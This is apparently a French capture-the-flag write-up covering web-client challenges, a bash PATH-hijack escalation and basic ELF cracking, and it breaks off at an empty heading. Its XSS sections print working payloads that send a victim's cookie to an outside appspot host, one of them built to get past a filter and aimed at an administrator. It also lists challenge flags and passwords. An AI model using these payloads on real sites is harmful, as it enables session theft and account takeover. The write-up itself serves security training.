# Challenge web client

## HTML - boutons désactivés

Réactiver les inputs HTML en enlevant le paramètre disable.

```html
[...]
<input _disable type="text" name="auth-login" value="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;);">
<input _disable type="submit" value="Member access" name="authbutton">
[...]
```

Et accéder à la page suivante.

```html
[...]
Member access granted! The validation password is HTMLCantStopYou
[...]
```

## Javascript - Authentification

Le mot de passe est présent en clair dans le code:

```Javascript
[...]
if (pseudo=="4dm1n" && password=="sh.org") {
[...]
```

## Javascript - Source

Le mot de passe est présent en clair dans le code:

```Javascript
[...]
if ( pass == "123456azerty" ) {
[...]
```

## Javascript - Authentification 2

Le mot de passe est present en clair dans le code:

```Javascript
[...]
var TheLists = ["GOD:HIDDEN"];
[...]
var TheSplit = TheLists[i].split(":");
var TheUsername = TheSplit[0];
var ThePassword = TheSplit[1];
[...]
```

## Javascript - Obfuscation 1

Le mot de passe est présent dans le code et peut être obtenu avec "unescape" qui permet de passer d'un format HTML entities à un format UTf-8.

```Javascript
[...]
pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
h = window.prompt('Entrez le mot de passe / Enter password');
if(h == unescape(pass)) {
[...]
```

## Javascript - Obfuscation 2

Le mot de passe est présent dans le code et peut-être obtenu par l'évaluation du code en string.

```Javascript
console.log(eval(eval(unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29"))));
```

## XSS - Stockée 1

Le champ texte est vulnérable à des injections de balise HTML et permet ainsi l'injection de code Javascript.

```Javascript
<script>window.location="http://sandbox-209707.appspot.com/" + document.cookie;</script>
```

## XSS - DOM Based

Sur la page Game une injection script est possible sur les champs nickname et color. En revanche color se peut contenir que 3 caractères et nickname environ 80 caractères. Le mot "location" et les lettres (, ), ", `, ', ;, + et . sont filtrés.
Ainsi nous allons injecter directement dans l'URL les éléments commençant par espace les accolades afin de pouvoir exploiter le 2e champ:

```shell
"/*
```

Puis injecter une redirection vers un serveur:

```Javascript
// Fermer le commentaire ouverte
*/

// Fermer la propriété ouverte
,

// Remettre les champs utilisés par la condition
callbacks: {
    win:this.youwon,
    lose:{
        // Créer une redirection vers un hook avec windows.location
        d: window[
            // Utilisation de RegExr pour contourner le filtrage des strings
            /loc/.source

            // Utilisation de HTML entities pour contourner le filtrage de l'operateur de concatenation
            %2B
            /ation/.source]=/http:\/\/sandbox-209707.appspot.com/.source
    }
}
//
```

Pour enfin en envoyant l'URL par email à l'administrateur pour ensuite récupérer son cookie pour se connecter au compte administrateur.

# Challenger app system

## Bash - System 1

Liste des caractéristiques du challenge:

- L'écriture est autorisée uniquement sur les dossiers /tmp et /var/tmp
- L'exécutable présente des droits spécifique permettant d'interagir avec le fichier cible;
- Ni le code source ou l'exécutable ne peut être modifiée;
- La source du programme présente une seule fonction main en entre faisant appel à une function basse niveau qui permet l'exécution de command Bash et retourne le code status;
- La fonction appelle est ls sur un fichier écrite en dur.

Exploit:

Le progamme fait un appel system dont la commande ls est une command relative au $PATH.

```c
[...]
system("ls /challenge/app-script/ch11/.passwd");
[...]
```

Donc nous pouvons injecter une autre commande par le l'Environnement variable $PATH. En prenant soin de retirer les commandes dans le /bin pour éviter tout conflit avec notre commande créé dans le /var/tmp

```shell
$ cat /bin/cat > /var/tmp/ls
$ export PATH=/var/tmp
$ ./ch11
!oPe96a/.s8d5
```

# Challenge cracking

## 1. ELF - 0 Protection

Nous avons utilisé la commande UNIX [`strings`](https://linux.die.net/man/1/strings) permettant de lire les strings d'un binaire. A partir de ça, nous avons repéré le mot de passe dans le après l'appel de la méthode `_-libc_start_main`:

```shell=bash
__libc_start_main
GLIBC_2.0
PTRh@
[^_]
%s : "%s"
Allocating memory
Reallocating memory
123456789
```

Le mot de passe est donc **123456789**.

## 2. ELF - x86 Basique

Nous avons utilisé le debbuger `gdb` pour récupérer le user et le mot de passe du programme. A l'aide de la commande `disassemble main`, nous récupérons le contenu de la fonction main en assembleur et nous avons remarqué la déclaration de variables DWORD PTR aux valeurs **0x80a6b19** et **0x80a6b1e**

```shell=bash
Dump of assembler code for function main:
   0x08048309 <+0>:	lea    ecx,[esp+0x4]
   0x0804830d <+4>:	and    esp,0xfffffff0
   0x08048310 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048313 <+10>:	push   ebp
   0x08048314 <+11>:	mov    ebp,esp
   0x08048316 <+13>:	push   ecx
   0x08048317 <+14>:	sub    esp,0x24
   0x0804831a <+17>:	mov    DWORD PTR [ebp-0xc],0x80a6b19
   0x08048321 <+24>:	mov    DWORD PTR [ebp-0x10],0x80a6b1e
```

Ensuite, grâce à la commande `x/s`, on peut récupérer la string correspondante, soit un username `john` et un password `the ripper`.

Le mot de passe trouvé avec les identifiants est donc **987654321**.

## 3. PE - 0 Protection